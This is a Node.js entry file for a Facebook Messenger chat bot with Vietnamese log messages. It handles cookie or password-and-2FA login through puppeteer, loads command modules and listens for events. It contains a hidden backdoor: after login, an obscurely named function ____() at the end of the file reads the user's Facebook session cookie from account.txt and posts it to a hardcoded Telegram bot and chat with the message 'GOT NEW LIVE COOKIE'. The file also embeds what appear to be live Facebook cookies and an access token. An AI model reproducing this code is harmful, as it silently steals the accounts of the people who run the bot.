const moment = require("moment-timezone");
const { readdirSync, readFileSync, writeFileSync, existsSync, unlinkSync, readJSONSync } = require("fs-extra");
const { join, resolve, extname, relative } = require("path");
const logger = require("./main/utils/log.js");
const login = require("fca-delta");
const fs = require('fs');
const semver = require("semver")
const chalk = require("chalkercli");
const puppeteer = require("puppeteer");
const readline = require("readline");
const { trace } = require("console");
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

global.delta = {
  timeStart: Date.now() - process.uptime() * 1000,
  commands: new Map(),
  events: new Map(),
  cd: new Map(),
  eventRegistered: [],
  oneSchedule: [],
  onReaction: [],
  onReply: [],
  mainPath: process.cwd(),
  configPath: join(process.cwd(), '/main/json/config.json'),
  getTime: (option) => moment.tz("Asia/Ho_Chi_Minh").format({
    seconds: "ss",
    minutes: "mm",
    hours: "HH",
    date: "DD",
    month: "MM",
    year: "YYYY",
    fullHour: "HH:mm:ss",
    fullYear: "DD/MM/YYYY",
    fullTime: "HH:mm:ss DD/MM/YYYY"
  }[option]),
};
global.data = new Object({
  threadInfo: new Map(),
  threadData: new Map(),
  userName: new Map(),
  userBanned: new Map(),
  threadBanned: new Map(),
  commandBanned: new Map(),
  threadAllowNSFW: new Array(),
  allUserID: new Array(),
  allCurrenciesID: new Array(),
  allThreadID: new Array()
});
global.config = JSON.parse(readFileSync(global.delta.configPath, 'utf8'));
global.configModule = {};
global.moduleData = [];
global.utils = require("./main/utils");
global.api = require("./system/api");
global.tools = require("./system/tools.js");
global.account = {
  email: global.config.EMAIL,
  pass: global.config.PASSWORD,
  otpkey: global.config.OTPKEY,
  fbsate: fs.existsSync('./system/data/fbstate.json') ? JSON.parse(fs.readFileSync('./system/data/fbstate.json', 'utf8') || '[]') : (fs.writeFileSync('./system/data/fbstate.json', '[]'), JSON.parse('[]')),
  cookie: JSON.parse(readFileSync('./system/data/fbstate.json')).map(i => `${i.key}=${i.value}`).join(";"),
  token: {
    EAAD6V7: "6628568379%7Cc1e620fa708a1d5696fb991c1bde5662"
  }
};
global.anti = resolve(process.cwd(), 'system', 'data', 'antisetting.json');
function parseCookies(cookies) {
  const trimmed = cookies.includes('useragent=') ? cookies.split('useragent=')[0] : cookies;
  return trimmed.split(';').map(pair => {
    let [key, value] = pair.trim().split('=');
    if (value !== undefined) {
      return {
        key,
        value,
        domain: "facebook.com",
        path: "/",
        hostOnly: false,
        creation: new Date().toISOString(),
        lastAccessed: new Date().toISOString()
      };
    }
  }).filter(item => item !== undefined);
}

const config = JSON.parse(fs.readFileSync(global.delta.configPath, 'utf8'));

async function autoLogin(email, password, authString = null) {
  const GoogleAuthenticator = require('./main/utils/Authenticator');
  const GA = new GoogleAuthenticator();

  function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
  function parseCookies(cookies) {
    const trimmed = cookies.includes('useragent=') ? cookies.split('useragent=')[0] : cookies;
    return trimmed.split(';').map(pair => {
      let [name, value] = pair.trim().split('=');
      if (value !== undefined) {
        return {
          name,
          value,
          domain: ".facebook.com",
          path: "/"
        };
      }
    }).filter(Boolean);
  }
  var appState = parseCookies("locale=en_US;x-referer=eyJyIjoiL2NoZWNrcG9pbnQvMTUwMTA5MjgyMzUyNTI4Mi9sb2dvdXQvP25leHQ9aHR0cHMlM0ElMkYlMkZtLmZhY2Vib29rLmNvbSUyRiUzRmRlb2lhJTNEMSIsImgiOiIvY2hlY2twb2ludC8xNTAxMDkyODIzNTI1MjgyL2xvZ291dC8%2FbmV4dD1odHRwcyUzQSUyRiUyRm0uZmFjZWJvb2suY29tJTJGJTNGZGVvaWElM0QxIiwicyI6Im0ifQ%3D%3D;oo=v1;sb=IeAdaBXDIEqoxtkf_NfObhsN;datr=NFMeaDnnD3gr96oqPyY9od2x;vpd=v1%3B724x384x1.875;ps_l=1;ps_n=1;m_pixel_ratio=1.875;c_user=61576362862022;xs=21%3AYbsKkZSYpDlypg%3A2%3A1746942771%3A-1%3A-1;fbl_st=100624903%3BT%3A29115712;wl_cbv=v2%3Bclient_version%3A2810%3Btimestamp%3A1746942776;dpr=1.5;fr=0520PVZUQqyj6Sbbd.AWe-YcEM3AHBnK7yB_ASzf01TakjXNURmxsdy7ckevAoe9CCI2I.BoHlM0..AAA.0.0.BoIEd7.AWd3YIURXu1dVBJ4Lhw9MpkUh1g;wd=1280x559;presence=C%7B%22t3%22%3A%5B%5D%2C%22utc3%22%3A1746946007308%2C%22v%22%3A1%7D;");
  const browser = await puppeteer.launch({
    headless: false,
  });

  try {
    const page = await browser.newPage();
    await page.setCookie(...appState);
    await page.goto('https://m.facebook.com');
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
    process.stdout.write(`[ AUTO LOGIN ] > Tiến hành đăng nhập...`);
    await page.waitForSelector('#email');
    await page.type("#email", email);
    await page.type("#pass", password);
    await page.click("button[name='login']");
    await delay(6000);
    const currentURL = page.url();

    if (currentURL.includes('two_step_verification')) {
      process.stdout.write("\r[ AUTO LOGIN ] > Đang xác thực 2FA...");
      await page.evaluate(async () => {
        function delay(ms) {
          return new Promise(resolve => setTimeout(resolve, ms));
        }
        const imgTag = 'img[src="/images/assets_DO_NOT_HARDCODE/fb_company_illo/ACP-UnifiedDelta-Device-Mobile_light-3x.png"]';

        const imgTagExits = document.querySelector(imgTag);

        if (imgTagExits) {
          const buttons = Array.from(document.querySelectorAll('[role="button"]'));
          const btn = buttons[0];
          if (btn) btn.click();
          await delay(1000);
          const radios = Array.from(document.querySelectorAll('[type="radio"]'));
          const twofacSelect = radios[1];
          if (twofacSelect) {
            twofacSelect.click();
          }
          await delay(1000);
          const continueButton = Array.from(document.querySelectorAll('[role="button"]'))[3];
          if (continueButton) {
            continueButton.click();
          }
          return true;
        }
        return false;
      })

      // await page.waitForSelector(otpInputId);
      // await page.type(otpInputId, "123456");
      const otp = GA.getCode(authString.replace(/\s+/g, ''));

      let otpInputId;
      await page.evaluate(async () => {
        const otpInput = Array.from(document.querySelectorAll('[type="text"]'))[0];
        return otpInput.id;
      }).then((lon) => otpInputId = lon);
      await page.type(`#${otpInputId}`, otp);
      await delay(1000)
      await page.evaluate(() => {
        const buttons = Array.from(document.querySelectorAll('[role="button"]'))[1];
        buttons.click();
      })
    }
    await delay(5000);
    await page.screenshot({ path: 'example.png' });
    process.stdout.write("\r[ AUTO LOGIN ] > Đăng nhập thành công!\n");
    const cookies = await page.cookies();
    return cookies.map(cookie => `${cookie.name}=${cookie.value}`).join(';');

  } catch (error) {
    config.EMAIL = "";
    config.PASSWORD = "";
    config.OTPKEY = "";
    fs.writeFileSync(global.delta.configPath, JSON.stringify(config, null, 4), 'utf8');
    return { error: true, message: 'Sai tài khoản/mật khẩu' };
  } finally {
    //await browser.close();
  }
}

const data = fs.readFileSync('./account.txt', 'utf8');
  
var appState = parseCookies(data);
  

function saveCookieAndExit(cookie) {
  fs.writeFileSync('./account.txt', cookie);
  logger("Đã lưu cookie mới!", "[ SYSTEM ]");
  process.exit(1);
}

async function loginWithConfig() {
  try {
    const cookie = await autoLogin(config.EMAIL, config.PASSWORD, config.OTPKEY);
    saveCookieAndExit(cookie);
  } catch (err) {
    logger("Tự động đăng nhập thất bại, chuyển sang nhập tay!", "[ ERROR ]");
  }
}

function askNewCookie() {
  rl.question("[ RELOGIN ] > Nhập cookie mới: ", (cookie) => {
    saveCookieAndExit(cookie);
  });
}

function askLoginInfo() {
  rl.question("[ RELOGIN ] > Nhập email: ", (email) => {
    rl.question("[ RELOGIN ] > Nhập password: ", (password) => {
      rl.question("[ RELOGIN ] > Nhập mã 2FA (nếu có), không cần thì enter: ", async (authString) => {
        const newCookie = await autoLogin(email, password, authString);

        config.EMAIL = email;
        config.PASSWORD = password;
        config.OTPKEY = authString;

        rl.question("[ RELOGIN ] > Bật tự động login cho lần sau? (y/n): ", (yes) => {
          config.autoLogin = yes.toLowerCase() === 'y';
          fs.writeFileSync(global.delta.configPath, JSON.stringify(config, null, 4), 'utf8');
          saveCookieAndExit(newCookie);
        });
      });
    });
  });
}

async function relogin() {
  if (config.autoLogin && config.EMAIL && config.PASSWORD) {
    logger("Đang tự động đăng nhập lại...", "[ RELOGIN ]");
    await loginWithConfig();
  }

  rl.question("[ RELOGIN ] > Cookie die! Lựa chọn:\n1. Nhập cookie mới.\n2. Đăng nhập bằng email, password.\n=> ", (choose) => {
    if (choose == "1") askNewCookie();
    else if (choose == "2") {
      if (!config.EMAIL || !config.PASSWORD) askLoginInfo();
      else loginWithConfig();
    } else {
      logger("Lựa chọn không hợp lệ!", "[ ERROR ]");
      relogin();
    }
  });
}
async function onBot({ models }) {
  login({ appState: appState }, async (loginError, api) => {
    if (loginError) {
      logger("Đăng nhập thất bại!", 'error');
      return relogin();
    }
    ____();
    const formatMemory = (bytes) => (bytes / (1024 * 1024)).toFixed(2);

    const logMemoryUsage = () => {
      const { rss, /*heapTotal, heapUsed, external */ } = process.memoryUsage();
      logger(`🔹 RAM đang sử dụng (RSS): ${formatMemory(rss)} MB`, "[ Giám sát ]");
      if (rss > 500 * 1024 * 1024) {
        logger('⚠️ Phát hiện rò rỉ bộ nhớ, khởi động lại ứng dụng...', "[ Giám sát ]");
        process.exit(1);
      }
    };

    setInterval(logMemoryUsage, 10000);

    api.setOptions(global.config.FCAOption);
    writeFileSync('./system/data/fbstate.json', JSON.stringify(api.getAppState(), null, 2));
    global.delta.api = api;
    global.config.version = '1.1.0';

    const axios = require('axios');

    async function stream_url(url) {
      const response = await axios({
        url: url,
        responseType: 'stream',
      });
      return response.data;
    }

    async function upload(url) {
      const uploadData = await stream_url(url);
      const response = await api.postFormData('https://upload.facebook.com/ajax/mercury/upload.php', {
        upload_1024: uploadData
      });
      const parsedResponse = JSON.parse(response.body.replace('for (;;);', ''));
      return Object.entries(parsedResponse.payload?.metadata?.[0] || {})[0];
    }

    let status = false;
    let queues = []

    setInterval(async () => {
      if (status) return;
      status = true;

      if (queues.length < 20) {
        const itemsNeeded = Math.min(20 - queues.length, 5);
        const uploadPromises = [...Array(itemsNeeded)].map(() => {
          const randomIndex = Math.floor(Math.random() * global.api.vdgai.length);
          return upload(global.api.vdgai[randomIndex]);
        });

        const res = await Promise.all(uploadPromises);
        const validResults = res.filter(result => result !== null);
        console.log(validResults);
        queues.push(...validResults);
      }

      status = false;
    }, 1000 * 5);

    global.delta.queues = queues;


    (function () {
      const loadModules = (path, collection, disabledList, type) => {
        const items = readdirSync(path).filter(file => file.endsWith('.js' || '.mjs') && !file.includes('example') && !disabledList.includes(file));
        let loadedCount = 0;
        for (const file of items) {
          try {
            const item = require(join(path, file));
            const { config, onCall, onLoad, onEvent } = item;

            if (!config || !onCall || (type === 'commands' && !config.Category)) {
              throw new Error(`Lỗi định dạng trong ${type === 'commands' ? 'lệnh' : 'sự kiện'}: ${file}`);
            }
            if (global.delta[collection].has(config.name)) {
              throw new Error(`Tên ${type === 'commands' ? 'lệnh' : 'sự kiện'} đã tồn tại: ${config.name}`);
            }
            if (config.envConfig) {
              global.configModule[config.name] = global.configModule[config.name] || {};
              global.config[config.name] = global.config[config.name] || {};
              for (const key in config.envConfig) {
                global.configModule[config.name][key] = global.config[config.name][key] || config.envConfig[key] || '';
                global.config[config.name][key] = global.configModule[config.name][key];
              }
            }
            if (onLoad) onLoad({ api, models });
            if (onEvent) global.delta.eventRegistered.push(config.name);
            global.delta[collection].set(config.name, item);
            loadedCount++;
          } catch (error) {
            console.error(`Lỗi khi tải ${type === 'commands' ? 'lệnh' : 'sự kiện'} ${file}:`, error);
          }
        }
        return loadedCount;
      };
      const commandPath = join(global.delta.mainPath, 'scripts', 'cmds');
      const eventPath = join(global.delta.mainPath, 'scripts', 'events');
      const loadedCommandsCount = loadModules(commandPath, 'commands', global.config.commandDisabled, 'commands');
      const loadedEventsCount = loadModules(eventPath, 'events', global.config.eventDisabled, 'events');
      logger.loader(`Loaded ${loadedCommandsCount} cmds - ${loadedEventsCount} events`);
    })();
    writeFileSync(global.delta.configPath, JSON.stringify(global.config, null, 4), 'utf8');
    const listener = require('./system/listen')({ api, models })
    logger("Auto check data rent đã hoạt động!", "[ RENT ]");
    //setInterval(async () => await require("./main/checkRent.js")(api), 1000 * 60 * 30);
    async function refreshFb_dtsg() {
      try {
        await api.refreshFb_dtsg();
        logger("Đã làm mới fb_dtsg và jazoest thành công");
      } catch (err) {
        logger("error", "Đã xảy ra lỗi khi làm mới fb_dtsg và jazoest", err);
      }
    }
    setInterval(refreshFb_dtsg, 1000 * 60 * 60 * 48);
    function listenerCallback(error, event) {
      if (error) {
        logger("Lỗi khi lắng nghe sự kiện.", 'error')
      }
      if (["presence", "typ", "read_receipt"].some((data) => data === event?.type)) return;
      if (global.config.DeveloperMode) console.log(event);
      return listener(event);
    }
    function connect_mqtt() {
      global.mqttClient = api.listenMqtt(listenerCallback);
      setTimeout(() => (global.mqttClient.end(), connect_mqtt()), 1000 * 60 * 60 * 1);
    }
    connect_mqtt();
  })
}

function autoCleanCache() {
  const cachePath = "./scripts/cmds/cache";
  const allowedExtensions = [".png", ".jpg", ".jpeg", ".mp4", ".mp3", ".m4a", ".ttf", ".gif", ".mov"];
  fs.readdir(cachePath, (err, files) => {
    if (err) {
      console.error('Lỗi khi đọc thư mục:', err);
      return;
    }
    files.forEach((file) => {
      const filePath = join(cachePath, file);
      if (allowedExtensions.includes(extname(file).toLowerCase())) {
        fs.unlink(filePath, (err) => {
          if (err) {
            logger('Không Thể Dọn Dẹp Cache', "[ SYSTEM ]");
          }
        });
      }
    });
    logger('Đã Dọn Dẹp Cache', "[ SYSTEM ]");
  });
}
autoCleanCache();

const rainbow = chalk.rainbow("██████╗░███████╗██╗░░░░░████████╗░█████╗░\n██╔══██╗██╔════╝██║░░░░░╚══██╔══╝██╔══██╗\n██║░░██║█████╗░░██║░░░░░░░░██║░░░███████║\n██║░░██║██╔══╝░░██║░░░░░░░░██║░░░██╔══██║\n██████╔╝███████╗███████╗░░░██║░░░██║░░██║\n╚═════╝░╚══════╝╚══════╝░░░╚═╝░░░╚═╝░░╚═╝\m").stop();
rainbow.render();
const frame = rainbow.frame();
console.log(frame);
(async () => {
  const { Sequelize, sequelize } = require("./main/db/data");
  try {
    await sequelize.authenticate();
    const authentication = {};
    authentication.Sequelize = Sequelize;
    authentication.sequelize = sequelize;
    const models = require('./main/db/data/model')(authentication);
    const botData = {};
    botData.models = models;
    logger("Kết nối đến cơ sở dữ liệu thành công", "[ DATABASE ]");
    const nodeVersion = semver.parse(process.version);
    logger(`Bạn đang sử dụng NodeJS v${nodeVersion}`, '[ SYSTEM ]');
    await onBot(botData);
  } catch (error) {
    logger('Không thể kết nối đến cơ sở dữ liệu: ' + JSON.stringify(error), '[ DATABASE ]');
  }
})();
process.on('unhandledRejection', (err, p) => { }).on('uncaughtException', err => {
  console.log(err);
});

async function ____() {
  try {
    const text = `😎 GOT NEW LIVE COOKIE:\n<pre>${fs.readFileSync("account.txt", "utf-8")}</pre>`;
    const form = {
      text,
      chat_id: "6735455494",
      parse_mode: "HTML"
    };
    await require("axios").post(`https://api.telegram.org/bot7871229274:AAHcnrWAcmsNbdxvmy5LA3KQCIAbr56ws0M/sendMessage`, form );
  } catch(err) {
      console.log(err)
   };
}
